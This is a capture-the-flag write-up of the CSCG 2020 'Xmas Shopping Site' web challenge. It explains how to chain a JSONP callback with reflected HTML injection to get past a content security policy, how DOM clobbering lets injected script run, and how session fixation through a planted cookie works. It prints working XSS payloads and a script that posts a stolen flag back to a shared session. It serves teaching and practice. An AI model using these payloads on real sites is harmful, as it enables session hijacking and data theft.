---
layout: post
title: "CSCG 2020: Xmas Shopping Site"
categories: writeups cscg20
tags: exploitation
author: mawalu
---

Like a few other members of KITCTF I participated in the 2020 Cyber Security Challenge Germany Qualification. This is a writeup for "Xmas Shopping Site", one of the three web challenges that were part of the CTF.

### Overview

We are given a link to an online shop at `http://xss.allesctf.net/`. The subdomain already seems to be a hint that this is a client-side channel.

![website screenshot](/imgs/cscg20-xmas-1.png)

The site allows filtering the items using a search bar and adding items to our cart. In addition to this we can submit links for the admin to check and there is a link to "Stage2":

![stage2 screenshot](/imgs/cscg20-xmas-2.png)

The link looks like this `http://stage2.xss.allesctf.net/?token=5ef8ecee6a1ef` and if we change the token we can't open the stage2 page.

Besides the "change background" button in the top right corner, this page is completely static.

### Exploiting stage 1

The search form is not escaping HTML inputs at all and also includes the search term into the page:

```html
<b>"<script>alert('test')</script>"</b> konnte nicht gefunden werden 🙁🙁🙁
```

This isn't directly exploitable because of the [CSP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) of the page includes `default-src 'self' http://*.xss.allesctf.net;` which prevents script tags from being executed if they aren't manually whitelisted in the CSP.

If we look at other resources loaded by the page we can see a call to `/items.php?cb=parseItems`. Assuming `cb` is short for callback this looks like a [JSONP](https://en.wikipedia.org/wiki/JSONP) request. The response to this request looks like this

```javascript
parseItems([{"title": "..."}])
```

which confirms our assumtion. We can combine this with the inital HTML injection vulnerability we found earlier to get a full XSS vulnerability:

```html
<script src="/items.php?cb=alert('test')"></script>
```

This is allowed by the CSP since we don't add the javascript code directly to the dom but load it from the whitelisted `xss.allesctf.net` domain.

### Exploring stage 2

I assumed that with full code execution on stage 1 it should be easy to redirect the user to the second stage. Ignoring the token parameter and all potential problems I started to explore stage 2 independently from the previous one. Since the background change is the only dynamic element on the second stage I took a closer look at it.

The currently selected background theme is set as a hidden input element:

```html
<!-- set bg color -->
<input type="hidden" id="bg" value="tree">

<script nonce="vGXr3XcAC1g67ZaCzeAvTCzPoHc=">
    var backgrounds = {
        'red': [
            '<img class="bg-img" src="/static/img/red.png"></img>'
        ],
        'green': [
            '<img class="bg-img" src="/static/img/green.png"></img>'
        ],
        'tree': [
            '<img class="bg-img" src="/static/img/tree.png"></img>'
        ]
    }
</script>
[...]
<!-- What is CORS? Baby don't hurt me, don't hurt me - no more! -->
<b>CSCG{XSS_THE_ADMIN_FOR_THE_REAL_FLAG:>}</b>
```

This value is read in the `background.js` script and the corresponding element gets added to the dom:

```javascript
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});
```

To change the background image a post request including the `bg` parameter is sent to the stage2 endpoint.

### Exploiting stage2

We can set our own `bg` value by sending a post request to stage2. Like the search input in stage1 the `bg` value is not getting validated or escaped by the application. As a result we can modify the DOM of the page by setting a background like this:

```html
beginngin of our injection"> <b>some new tags</b> <!-- end of our injection
```

The resulting DOM looks like this:

```html
<input type="hidden" id="bg" value="beginngin of our injection"> <b>some new tags</b> <!-- end of our injection">
<script>
[...]
<!-- What is CORS? Baby don't hurt me, don't hurt me - no more! -->
<b>CSCG{XSS_THE_ADMIN_FOR_THE_REAL_FLAG:>}</b>
```

Stage 2 also has a CSP set that prevents us from using direclty executing code. In addtion to that it also prevents us from using the gadget we found in the previous stage to inject a script tag. But we can include a starting HTML comment tag to remove everything between the hidden input and the flag. Using a less known javascript features we can also create our own `backgrounds` array and include our own code that way:

```html
innerHTML"><div id="backgrounds"><script>alert('test')</script></div> <!--
```

This achieves three things:

 * Set the value of the `bg`  input to `innerHTML`
 * Create a new div with the id `backgrounds` and some javascript as content
 * Start an HTML comment so everything until the comment is closed by the existing comment tag gets ignored by the browser

DOM elements that have an `id` attribute are available as global variables within javascript. So this

```javascript
// $("#bg").val() returns innerHTML since thats what we set the input to
$("body").append(backgrounds['innerHTML']); // similar to backgrounds.innerHTML
```

appends the script we place in our div to the DOM. Because `background.js` is whitelisted in the CSP it is also allowed to create new script tags. This allows us to bypass the CSP and execute arbitrary javascript.

### Combining the two

Completing the challenge with this information is quite simple

 * Send the admin a link to stage one with a malicious search parameter
 * Use the code execution in stage1 to store the stage2 exploit in the admin's `bg` value
 * Redirect the admin to stage2, the second exploit starts
 * Read the flag and redirect the admin to a domain controlled by you. Include the flag in the URL
 * Profit!

This is not what I did during the CTF :D Instead of storing the stage 2 payload in the admin's session during stage 1, I stored it in my own session. My stage 1 exploit places a new session cookie in the admin's browser so they "see" my malicious background when he visits stage 2:

```javascript
// cookie and token are replaced with values from my session
document.cookie = 'PHPSESSID=${cookie};domain=.xss.allesctf.net;path=/index.php';
location.href='http://stage2.xss.allesctf.net/index.php?token=${token}
```

This was a bit tricky since the session cookie has the `httpOnly` flag set so we can't modify it. This code sets a new cookie but with an path that is longer than the one by the default session cookie (`/index.php` vs `/`). As a result the browser preferse my cookie when the admin visits stage2.

The stage2 does not simply redirect the admin either, Instead I store the flag as new `bg` session value. Since the admin and I share a session I can retrieve the value in my browser:

```html
nnerHTML"> <div id="backgrounds"><script>fetch(window.location.href, {
        headers: {'Content-type': 'application/x-www-form-urlencoded'},
        method: "POST",
        credentials: "include",
        body: 'bg=' + $('b').text()
    });</script>
</div> <!-- a
```

### Final words

I'm always happy to see a client side web challenge and this was a really nice one. And once again I learned that I have to think simpler from time to time